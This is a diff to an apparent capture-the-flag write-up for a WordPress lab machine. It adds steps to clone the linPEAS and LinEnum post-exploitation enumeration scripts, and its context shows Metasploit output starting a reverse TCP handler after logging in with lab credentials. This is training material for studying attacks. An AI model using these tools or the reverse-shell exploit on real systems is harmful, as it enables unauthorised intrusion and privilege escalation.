@@ -236,6 +236,17 @@ This is useful because it gives us a nice monitor if the vpn connection fails, a
 We might as well pull up the target site and see what's up.
 
 
+## Post Exploitation Tools
+
+Once we have access to a machine, we can upload some helpful files that can enumerate the victim. Peas and LinEnum are two of my favorite for this.
+
+```
+cd ~/sources
+git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
+git clone https://github.com/rebootuser/LinEnum.git
+```
+
+
 ## Information Gathering
 
 First, the challenge room mentions that we have to add blog.thm to our /etc/hosts, so let's do that now.
@@ -384,7 +395,7 @@ set rhosts 10.10.10.10 <replace with the IP thm gives you>
 Now we just need to execute our attack!
 
 ```
-[*] Started reverse TCP handler on 10.6.8.193:4444 
+[*] Started reverse TCP handler on 10.6.8.193:4444
 [*] Authenticating with WordPress using kwheel:cutiepie1...
 [+] Authenticated with WordPress
 [*] Preparing payload...
